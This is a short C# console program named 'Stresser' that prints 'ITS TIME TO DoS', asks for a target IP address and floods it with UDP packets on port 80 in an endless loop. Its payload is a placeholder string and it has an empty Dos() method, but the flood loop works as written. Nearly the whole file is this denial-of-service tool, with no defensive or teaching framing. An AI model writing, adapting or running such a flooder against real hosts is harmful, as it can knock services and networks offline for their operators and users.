using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net;
using System.Linq;

namespace Stresser
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("ITS TIME TO DoS");

            byte[] packetdata = System.Text.ASCIIEncoding.ASCII.GetBytes("<byte here>");
            Console.WriteLine();

            Console.WriteLine("What ip?");
            string IP = Console.ReadLine();
            int Port = 80;

            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), Port);

            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);


            while (true)
            {
                client.SendTo(packetdata, ep);
            }
        }

        static void Dos()
        {
            
           
            
               



        }
    }
}
